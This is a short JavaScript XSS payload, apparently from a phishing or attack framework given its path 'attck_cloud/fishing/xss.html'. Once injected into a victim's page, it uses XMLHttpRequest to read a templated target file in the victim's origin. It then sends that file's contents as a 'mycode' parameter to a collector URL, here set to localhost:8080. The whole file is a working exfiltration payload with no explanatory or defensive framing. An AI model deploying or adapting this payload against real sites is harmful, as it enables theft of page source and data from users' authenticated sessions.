var u = 'http://localhost:8080/attck_cloud/fishing/xss.html?id=1&type=2&';
var cr;
if (document.charset) {
    cr = document.charset
} else if (document.characterSet) {
    cr = document.characterSet
};

function createXmlHttp() {
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest()
    } else {
        var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
        for (var n = 0; n < MSXML.length; n++) {
            try {
                xmlHttp = new ActiveXObject(MSXML[n]);
                break
            } catch (e) {}
        }
    }
}

createXmlHttp();
xmlHttp.onreadystatechange = writeSource;
xmlHttp.open("GET", "{set.filename}", true);
xmlHttp.send(null);

function postSource(cc) {
    createXmlHttp();
    url = u;
    cc = "mycode=" + cc;
    xmlHttp.open("get", url, true);
    xmlHttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlHttp.setRequestHeader("Content-length", cc.length);
    xmlHttp.setRequestHeader("Connection", "close");
    xmlHttp.send(cc)
}

function writeSource() {
    if (xmlHttp.readyState == 4) {
        var c = new postSource(xmlHttp.responseText)
    }
}
